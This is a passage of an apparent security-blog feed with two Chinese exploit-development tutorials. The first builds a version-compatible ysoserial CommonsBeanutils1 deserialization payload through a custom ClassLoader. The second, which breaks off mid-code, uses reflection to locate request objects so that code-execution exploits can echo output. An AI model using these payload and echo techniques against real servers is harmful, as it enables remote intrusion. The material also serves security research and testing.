ObjectStreamClass.getSerialVesionUID()"></p><p><strong>方案5:URLClassLoader</strong></p><p>使用URLClassLoader动态引入依赖jar可以很好的解决以上方案的缺陷。只是用在该场景下有些费劲，原因有三：</p><blockquote><p>第一，不方便隔离依赖。包含serialVesionUID不一致class的jar（这里简称<code>不一致jar</code>）是需要被隔离的。由于URLClassLoader是双亲委派模式，存在被父ClassLoader中的同名Class覆盖的风险。</p></blockquote><blockquote><p>第二，不方便共享依赖。Gadget依赖的部分jar可能不存在serialVesionUID不一致问题（这里简称<code>可共用jar</code>），我们需要共享。</p></blockquote><blockquote><p>第三，不方便添加Class到ClassLoader中，URLClassLoader只提供添加jar的方法。</p></blockquote><h2 id="0x03-自定义ClassLoader解决方案"><a href="#0x03-自定义ClassLoader解决方案" class="headerlink" title="0x03 自定义ClassLoader解决方案"></a>0x03 自定义ClassLoader解决方案</h2><p>在我看来比较完美的方案不仅要解决以上方案的缺陷，还要能防止各种未知的”副作用”。使用ClassLoader来解决的思路肯定是没错,但我们需要结合解决serialVesionUID不一致问题这个场景量身设计一个ClassLoader，核心有两点：</p><ol><li>改双亲委派为当前ClassLoader优先，方便隔离不一致jar共享可共用jar</li><li>方便添加Class和Jar到ClassLoader中</li></ol><p><strong>那么自定义ClassLoader是如何解决serialVesionUID不一致问题的呢？</strong></p><p>自定义ClassLoader可以很方便地切换<code>不一致jar</code>为漏洞环境的对应版本，生成的发序列化数据自然不会存在serialVesionUID不一致问题。具体实现如下图，我们自定义ClassLoader包含了Gadget class和不一致jar。当Gadget class实例化生成序列化对象时，由于当前ClassLoader优先原则，存在不一致问题的class使用的是自定义ClassLoader加载的，实现隔离。而其他Class找不到，自然走双亲委派模式，去父ClassLoader中查找，实现共享。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/custom-classloader.png" alt="自定义ClassLoader示意图"></p><p>下面我们分别来实现。</p><h2 id="0x04-addClass-amp-amp-addJar"><a href="#0x04-addClass-amp-amp-addJar" class="headerlink" title="0x04 addClass &amp;&amp; addJar"></a>0x04 addClass &amp;&amp; addJar</h2><p>首先我们自定义的ClassLoader需要维护要一个装载Class的Map <code>classByteMap</code>,<code>类名</code>为<code>键</code>，<code>类文件byte数据</code>为<code>值</code>。方便后续添加和获取Class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, <span class="keyword">byte</span>[]&gt; classByteMap = <span class="keyword">new</span> HashMap&lt;String,<span class="keyword">byte</span>[]&gt;();</span><br></pre></td></tr></table></figure><p>addClass方法，主要是为了方便我们我们把Gadget对应的class添加的自定义ClassLoader中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addClass</span><span class="params">(String className,<span class="keyword">byte</span>[] classByte)</span></span>&#123;</span><br><span class="line">    classByteMap.put(className,classByte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addJar方法，主要是为了方便把gadget的不一致jar快速添加到ClassLoader中。具体来说就是读取不一致jar中所有class的<code>class name</code>和<code>class byte</code>，存储到<code>classByteMap</code>中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readJar</span><span class="params">(JarFile jar)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    Enumeration&lt;JarEntry&gt; en = jar.entries();</span><br><span class="line">    <span class="comment">// 遍历jar文件所有实体</span></span><br><span class="line">    <span class="keyword">while</span> (en.hasMoreElements())&#123;</span><br><span class="line">        JarEntry je = en.nextElement();</span><br><span class="line">        String name = je.getName();</span><br><span class="line">        <span class="comment">// 只class文件进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (name.endsWith(<span class="string">".class"</span>))&#123;</span><br><span class="line">            String clss = name.replace(<span class="string">".class"</span>, <span class="string">""</span>).replaceAll(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.findLoadedClass(clss) != <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// 读取class的byte内容</span></span><br><span class="line">            InputStream input = jar.getInputStream(je);</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> bufferSize = <span class="number">4096</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[bufferSize];</span><br><span class="line">            <span class="keyword">int</span> bytesNumRead = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((bytesNumRead = input.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, bytesNumRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] cc = baos.toByteArray();</span><br><span class="line">            input.close();</span><br><span class="line">            <span class="comment">// 将class name 和class byte存储到classByteMap</span></span><br><span class="line">            classByteMap.put(clss, cc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-改双亲委派为自定义ClassLoader优先"><a href="#0x05-改双亲委派为自定义ClassLoader优先" class="headerlink" title="0x05 改双亲委派为自定义ClassLoader优先"></a>0x05 改双亲委派为自定义ClassLoader优先</h2><p>要想打破双亲委派，我们需要重新loadClass方法,修改加载逻辑为优先使用自定义ClassLoader加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// 1. 检测自定ClassLoader缓存中有没有，有的话直接返回</span></span><br><span class="line">        Class clazz = cacheClass.get(name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> != clazz) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2. 若缓存中没有，就从当前ClassLoader可加载的所有Class中找</span></span><br><span class="line">            clazz = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> != clazz) &#123;</span><br><span class="line">                cacheClass.put(name, clazz);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                clazz = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="comment">// 3.当自定义ClassLoader中没有找到目标class，再调用系统默认的加载机制,走双亲委派模式</span></span><br><span class="line">            clazz = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>findClass方法定义的是自定义ClassLoader查找Class的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">    <span class="comment">// 从classByteMap中获取</span></span><br><span class="line">    <span class="keyword">byte</span>[] result = classByteMap.get(name);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">// 没有找到则抛出对应异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 将一个字节数组转为Class对象</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(name, result, <span class="number">0</span>, result.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-编写版本兼容gadget"><a href="#0x06-编写版本兼容gadget" class="headerlink" title="0x06 编写版本兼容gadget"></a>0x06 编写版本兼容gadget</h2><p>依然以ysoserial <code>CommonsBeanutils1</code>为例子。ysoserial中默认commons-beanutils是1.9.2版本，下面我们给它添加一个兼容1.8.3版本的<code>CommonsBeanutils1_183</code>。</p><p>通过对比1.9.2和1.8.3序列化数据，发现serialVesionUID不一致的只有<code>org.apache.commons.beanutils.BeanComparator</code>类，它在<code>commons-beanutils-&lt;version&gt;.jar</code>中，剩余的<code>commons-collections-3.1.jar</code>和<code>commons-logging-1.2.jar</code>为可共用jar。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/commons-beanutils-ser.png" alt="两个版本的依赖jar生成的序列化数据对比"></p><p>接着就可以编写代码，调用自定义ClassLoader SuidClassLoader来解决serialVesionUID不一致问题了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Dependencies</span>(&#123;<span class="string">"commons-beanutils:commons-beanutils:1.8.3"</span>, <span class="string">"commons-collections:commons-collections:3.1"</span>, <span class="string">"commons-logging:commons-logging:1.2"</span>&#125;)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.FROHOFF,Authors.CONY1 &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutils1_183</span> <span class="keyword">extends</span> <span class="title">Object</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义ClassLoader对象</span></span><br><span class="line">        SuidClassLoader suidClassLoader = <span class="keyword">new</span> SuidClassLoader();</span><br><span class="line">        <span class="comment">// 将Gadget class添加到自定义ClassLoader中</span></span><br><span class="line">        suidClassLoader.addClass(CommonsBeanutils1.class.getName(),classAsBytes(CommonsBeanutils1.class));</span><br><span class="line">        <span class="comment">// 从资源目录读取commons-beanutils-1.8.3.jar的base64数据</span></span><br><span class="line">        InputStream is = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream(<span class="string">"commons-beanutils-1.8.3.txt"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] jarBytes = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(CommonUtil.readStringFromInputStream(is));</span><br><span class="line">        <span class="comment">// 将Gadget不一致jar添加到自定义ClassLoader中</span></span><br><span class="line">        suidClassLoader.addJar(jarBytes);</span><br><span class="line">        Class clsGadget = suidClassLoader.loadClass(<span class="string">"ysoserial.payloads.CommonsBeanutils1"</span>);</span><br><span class="line">        <span class="comment">// 判断存在serialVesionUID不一致问题的class是否是由自定义ClassLoader加载的</span></span><br><span class="line">        <span class="keyword">if</span>(BeanComparator.class.getClassLoader().equals(suidClassLoader))&#123;</span><br><span class="line">            <span class="comment">// 使用自定义ClassLoader加载的Gadget class创建对象，调用其getObject构建序列化对象</span></span><br><span class="line">            Object objGadget = clsGadget.newInstance();</span><br><span class="line">            Method getObject = objGadget.getClass().getDeclaredMethod(<span class="string">"getObject"</span>,String.class);</span><br><span class="line">            Object objPayload = getObject.invoke(objGadget,command);</span><br><span class="line">            suidClassLoader.cleanLoader();</span><br><span class="line">            <span class="keyword">return</span> objPayload;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"Class is not SuidClassLoader loading, serialization failure!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsBeanutils1_183.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Weblogic coherence.jar的gadget可如法炮制。近期忙完会将完整的代码上传到github项目<a href="http://github.com/woodpecker-framework/ysoserial-woodpecker.git" target="_blank" rel="noopener">ysoserial-woodpecker</a></p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.cnblogs.com/duanxz/p/3511695.html" target="_blank" rel="noopener">java类中serialversionuid 作用 是什么?举个例子说明</a></li><li><a href="https://www.cnblogs.com/wxd0108/p/6681618.html" target="_blank" rel="noopener">Java自定义类加载器与双亲委派模型</a></li><li><a href="https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial/" target="_blank" rel="noopener">Java Deserialization Exploitation With Customized Ysoserial Payloads</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;&lt;code&gt;serialVesionUid&lt;/code&gt;不一致导致反序列化失败也算是Java反序列化
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>半自动化挖掘request实现多种中间件回显</title>
    <link href="http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/"/>
    <id>http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</id>
    <published>2020-04-19T16:59:51.000Z</published>
    <updated>2020-04-19T20:01:41.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本文献给永远的<code>Avicii</code>,严格意义上我不算是一个<code>reaver</code>。但并不妨碍我深深的喜欢你的作品，它们陪伴着我度过了无数个编程的夜晚，十分感谢。今天不同人用不同的方式怀念你，我不会作曲，也不敢纹身。能给你分享的是我所热爱的事，在我看来这是最有质感的东西。R.I.P</p><h2 id="0x02-背景"><a href="#0x02-背景" class="headerlink" title="0x02 背景"></a>0x02 背景</h2><p>最近圈子里各位师傅都在分享shiro回显的方法，真是八仙过海过海各显神通。这里我也分享下自己针对回显的思考和解决方案。师傅们基本都是考虑中间件为Tomcat，框架为Shiro的反序列化漏洞如何回显。<strong>这里我从更大的层面来解决回显问题。也就是在任意中间件下，任意框架下可执行任意代码的漏洞如何回显？</strong></p><h2 id="0x03-基本思路"><a href="#0x03-基本思路" class="headerlink" title="0x03 基本思路"></a>0x03 基本思路</h2><p>回显的方式有很多种类，通过获取request对象来回显应该是最优雅通用的方法。而之前师傅们获取requst的方式基本都是去阅读和调试中间件的源码，确定requst存储的位置，最终反射获取。其实提炼出来就是两个步骤。</p><h4 id="第一步：寻找存储有request对象的全局变量"><a href="#第一步：寻找存储有request对象的全局变量" class="headerlink" title="第一步：寻找存储有request对象的全局变量"></a>第一步：寻找存储有request对象的全局变量</h4><p>这一步定位的是requst存储的范围，需要靠知识沉淀或阅读源码来确定request对象被存储到那些全局变量中去了。</p><p>为何要考虑全局变量呢？这是因为只有是全局的，我们才能保证漏洞触发时可以拿到这个对象。</p><p>按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过<code>Thread.currentThread()</code>或<code>Thread.getThreads()</code>获取。当然其他全局变量也有可能，这就需要去看具体中间件的源码了。比如前段时间先知上的李三师傅通过查看代码，发现<code>[MBeanServer](https://xz.aliyun.com/t/7535)</code>中也有request对象。</p><h4 id="第二步：半自动化反射搜索全局变量"><a href="#第二步：半自动化反射搜索全局变量" class="headerlink" title="第二步：半自动化反射搜索全局变量"></a>第二步：半自动化反射搜索全局变量</h4><p>这一步定位的是requst存储的具体位置,需要搜索requst对象具体存储在全局变量的那个属性里。我们可以通过反射技术遍历全局变量的所有属性的类型，若包含以下关键字可认为是我们要寻找的request对象。</p><ul><li>Requst</li><li>ServletRequest</li><li>RequstGroup</li><li>RequestInfo</li><li>RequestGroupInfo</li><li>…</li></ul><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/request.png" alt="request对象隐藏在全局变量中的位置"></p><h2 id="0x04-编码实现"><a href="#0x04-编码实现" class="headerlink" title="0x04 编码实现"></a>0x04 编码实现</h2><p>思路虽然简单，但实现反射搜索的细节其实还是有很多坑的，这里列举一些比较有意思的点和坑来说说。</p><h4 id="4-1-限制挖掘深度"><a href="#4-1-限制挖掘深度" class="headerlink" title="4.1 限制挖掘深度"></a>4.1 限制挖掘深度</h4><p>对于隐藏过深的requst对象我们最好不考虑，原因有两个。</p><ul><li><p>第一个是这样反射路径过长，就算是搜索到了，最终构造的payload数据会很大，对于shiro这种反序列化数据在头部的漏洞是致命的。</p></li><li><p>第二个是挖掘时间会很长，因为JVM虚拟机内存中的对象结构其实是非常的复杂的，一个对象的属性往往嵌套着另一个对象，另一个对象的属性继续嵌套其他对象…</p></li></ul><p>可以声明两个变量来代表当前深度和最大深度，通过防止当前深度大于最大深度，来限制挖掘深度。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> max_search_depth = <span class="number">1000</span>; <span class="comment">//最大挖掘深度</span></span><br><span class="line"><span class="keyword">int</span> current_depth = <span class="number">0</span> <span class="comment">//当前深度</span></span><br><span class="line"><span class="keyword">while</span>(...)&#123;</span><br><span class="line"><span class="comment">//最多挖多深</span></span><br><span class="line"><span class="keyword">if</span>(current_depth &gt; max_search_depth)&#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索</span></span><br><span class="line">...</span><br><span class="line">current_depth++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-排除相同引用的对象"><a href="#4-2-排除相同引用的对象" class="headerlink" title="4.2 排除相同引用的对象"></a>4.2 排除相同引用的对象</h4><p>一个对象中可能会存在其他对象多个相同的实例(引用相同)，是不能重复去遍历它属性的，否则会进入死循环。可以声明一个<code>visited</code>集合来存储已经遍历过的对象，在遍历之前先判断对象是否在该集合中，防止重复遍历！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;Object&gt; visited = <span class="keyword">new</span> HashSet&lt;Object&gt;();</span><br><span class="line"><span class="keyword">if</span>(!visited.contains(filed_object))&#123;</span><br><span class="line">visited.add(filed_object);</span><br><span class="line"><span class="comment">//继续搜索</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//跳过</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="4-3-设置黑名单"><a href="#4-3-设置黑名单" class="headerlink" title="4.3 设置黑名单"></a>4.3 设置黑名单</h4><p>某些类型不可能存有requst，一般有如下的系统类型,和一些自定义的类型。对于这些类型的对象的遍历只会浪费时间，我们可以设置一个黑名单将其排除掉。</p><ul><li>java.lang.Byte</li><li>java.lang.Short</li><li>java.lang.Integer</li><li>java.lang.Long</li><li>java.lang.Float</li><li>java.lang.Boolean</li><li>java.lang.String</li><li>java.lang.Class</li><li>java.lang.Character</li><li>java.io.File</li><li>…</li></ul><h4 id="4-4-搜索继承的所有属性"><a href="#4-4-搜索继承的所有属性" class="headerlink" title="4.4 搜索继承的所有属性"></a>4.4 搜索继承的所有属性</h4><p><code>getFields()</code>和<code>getDeclaredFields()</code>其实都没法获取对象的所有属性，导致搜索会有遗漏。比如一个对象的父类的父类的一个私有属性，我们怎么获取呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向上循环 遍历父类</span></span><br><span class="line"><span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line">    Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//搜索</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5-深度优先-vs-广度优先"><a href="#4-5-深度优先-vs-广度优先" class="headerlink" title="4.5 深度优先 vs 广度优先"></a>4.5 深度优先 vs 广度优先</h4><p>深度优先顾名思义就是会按照深度方向挖掘，它会先遍历至全局变量第一个属性最深层的所有末端，在继续第二属性依次类推。这样挖掘出来的反射链是比较长的。</p><p>在我实现完深度优先算法后，发现最致命的还不是反射链过长问题。深度优先可能会错过比较短的反射链。这是因为同一个requst对象的引用可能被存储在全局对象的多个属性中，有些藏的比较深，有的藏的比较浅。深度优先往往会先挖掘到比较深的那个，而根据我们相同对象不会第二次搜索原则，当搜索到存储比较浅的引用时，会被忽略了。这就导致我们只挖掘到了藏的比较深的，而错过了比较浅的。</p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/111.png" alt="全局变量结构示意图"></p><p>在学过算法，我们都知道广度优先就能解决路径最短问题，在这个问题上也是如此。针对上图的情况，两种算法挖掘的结果如下​。​</p><p>深度优先挖掘到两条反射链</p><ol><li>全局变量 &gt; Field01 &gt; Field03 &gt; Request@111</li><li>全局变量 &gt; Field04 &gt; Request@222</li></ol><p>广度度优先挖掘到两条反射链</p><ol><li>全局变量 &gt; Request@111</li><li>全局变量 &gt; Field04 &gt; Request@222</li></ol><p>而在实际环境中差别更加明显，以下是Tomcat8下搜索记录的对比。</p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/2.png" alt="实际挖掘广度优先挖掘结果与深度优先挖掘结果对比"></p><h2 id="0x05-实战挖掘"><a href="#0x05-实战挖掘" class="headerlink" title="0x05 实战挖掘"></a>0x05 实战挖掘</h2><p>基于以上想法，我设计了一款java内存对象搜索工具java-object-searcher，它可以很方便的帮助我们完成对request对象的搜索，当然不仅仅用于挖掘request。下面以<code>Tomcat7.0.94</code>为例挖掘requst。</p><p>项目地址：<a href="https://github.com/c0ny1/java-object-searcher" target="_blank" rel="noopener">https://github.com/c0ny1/java-object-searcher</a></p><h4 id="5-1-引入java-object-searcher"><a href="#5-1-引入java-object-searcher" class="headerlink" title="5.1 引入java-object-searcher"></a>5.1 引入java-object-searcher</h4><p>去<a href="https://github.com/c0ny1/java-object-searcher/releases" target="_blank" rel="noopener">java-object-searcher项目的releases</a>下载编译好的jar，引入到web项目和调试环境中。</p><h4 id="5-2-编写调用代码进行搜索"><a href="#5-2-编写调用代码进行搜索" class="headerlink" title="5.2 编写调用代码进行搜索"></a>5.2 编写调用代码进行搜索</h4><p>然后我们需要断点打在漏洞触发的位置，因为全局变量会随着中间件和Web项目运行被各个模块修改。而我们需要的是漏洞触发时，全局变量的状态（属性结构和值）。</p><p>接着在IDEA的<code>Evaluate</code>中编写java-object-searcher的调用代码，来搜索全局变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置搜索类型包含ServletRequest，RequstGroup，Request...等关键字的对象</span></span><br><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"ServletRequest"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"RequstGroup"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"RequestInfo"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"RequestGroupInfo"</span>).build());</span><br><span class="line">keys.add(<span class="keyword">new</span> Keyword.Builder().setField_type(<span class="string">"Request"</span>).build());</span><br><span class="line"><span class="comment">//新建一个广度优先搜索Thread.currentThread()的搜索器</span></span><br><span class="line">SearchRequstByBFS searcher = <span class="keyword">new</span> SearchRequstByBFS(Thread.currentThread(),keys);</span><br><span class="line"><span class="comment">//打开调试模式</span></span><br><span class="line">searcher.setIs_debug(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//挖掘深度为20</span></span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//设置报告保存位置</span></span><br><span class="line">searcher.setReport_save_path(<span class="string">"D:\\apache-tomcat-7.0.94\\bin"</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/3.png" alt="编写代码调用java-object-searcher挖掘request"></p><h4 id="5-3-根据挖掘结果构造回显payload"><a href="#5-3-根据挖掘结果构造回显payload" class="headerlink" title="5.3 根据挖掘结果构造回显payload"></a>5.3 根据挖掘结果构造回显payload</h4><p>根据上述挖掘到的反射链来构造回显，具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 